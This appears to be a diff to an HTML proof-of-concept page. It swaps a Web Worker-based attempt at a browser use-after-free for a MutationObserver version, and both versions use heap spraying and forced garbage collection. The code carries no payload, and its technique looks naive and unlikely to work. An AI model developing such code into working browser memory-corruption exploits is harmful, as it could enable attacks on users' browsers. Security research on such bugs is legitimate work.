@@ -3,34 +3,26 @@
 <head>
     <script>
         function exploitUAF() {
-            let worker = new Worker(URL.createObjectURL(new Blob([`
-                self.onmessage = function() {
-                    let policy = {
-                        createScriptURL: function(url) { return url; }
-                    };
-                    self.postMessage(policy);
-                };
-            `], { type: 'text/javascript' })));
+            let node = document.createElement("div");
+            document.body.appendChild(node);
 
-            worker.onmessage = function(e) {
-                let policy = e.data;
-                worker.terminate();
-                let memoryHog = new Array(10000);
-                for (let i = 0; i < 10000; i++) {
-                    memoryHog[i] = new Uint8Array(2048);
+            let observer = new MutationObserver(() => {
+                try {
+                    let cached = document.querySelector("div");
+                    console.log(cached.innerHTML);
+                } catch (e) {
+                    console.error(e.message);
+                    alert(e.message);
                 }
-                if (typeof gc === "function") gc();
-                setTimeout(() => {
-                    try {
-                        console.log(policy.createScriptURL("test"));
-                    } catch (e) {
-                        console.error(e.message);
-                        alert(e.message);
-                    }
-                }, 500);
-            };
+            });
 
-            worker.postMessage(null);
+            observer.observe(document.body, { childList: true, subtree: true });
+            document.body.removeChild(node); // تعديل أثناء الملاحظة
+            let memoryHog = new Array(10000);
+            for (let i = 0; i < 10000; i++) {
+                memoryHog[i] = new Uint8Array(2048);
+            }
+            if (typeof gc === "function") gc();
         }
     </script>
 </head>
